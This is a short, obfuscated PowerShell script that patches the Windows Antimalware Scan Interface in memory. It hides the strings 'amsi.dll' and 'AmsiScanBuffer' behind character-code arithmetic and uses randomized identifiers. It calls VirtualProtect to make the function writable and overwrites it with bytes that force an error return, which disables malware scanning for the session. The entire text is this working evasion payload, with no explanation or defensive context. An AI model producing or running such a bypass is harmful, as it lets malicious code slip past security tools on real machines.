$lS4hNfmz7 = @"
using System;
using System.Runtime.InteropServices;
public class lS4hNfmz7 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr jtmrIJFP0f, string ak8jtKaSNG);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr DJ22B53ER6n, UIntPtr ZujQvnW8, uint xzhPad6ps, out uint L8OPjE5IC7NSbzyrXF);
}
"@

Add-Type $lS4hNfmz7

$y2GNzf2B4sc = [lS4hNfmz7]::LoadLibrary("$([chAr]([BYte]0x61)+[ChAr](109*86/86)+[CHar](115+32-32)+[CHAR](59+46)+[chAr](46+13-13)+[chAr]([BytE]0x64)+[Char](108)+[CHAr]([BYTe]0x6c))")
$tsx = [lS4hNfmz7]::GetProcAddress($y2GNzf2B4sc, "$([cHAr]([byte]0x41)+[chAR]([BYTe]0x6d)+[ChAr]([bYtE]0x73)+[ChAr]([BYte]0x69)+[chaR](83*25/25)+[CHAR](15+84)+[CHaR](97)+[ChAR]([byte]0x6e)+[ChAR]([Byte]0x42)+[Char](79+38)+[CHar]([bYTe]0x66)+[cHaR]([bYte]0x66)+[Char](101*20/20)+[Char]([byTE]0x72))")
$p = 0
[lS4hNfmz7]::VirtualProtect($tsx, [uint32]5, 0x40, [ref]$p)
$D47EmS = "0xB8"
$ewKSDqastb = "0x57"
$Xxz = "0x00"
$xfnZ = "0x07"
$aTXe29x7E2Mc = "0x80"
$KdKUcydOv9LMl = "0xC3"
$PY7drpFHC8ZVrq7Y = [Byte[]] ($D47EmS,$ewKSDqastb,$Xxz,$xfnZ,+$aTXe29x7E2Mc,+$KdKUcydOv9LMl)
[System.Runtime.InteropServices.Marshal]::Copy($PY7drpFHC8ZVrq7Y, 0, $tsx, 6)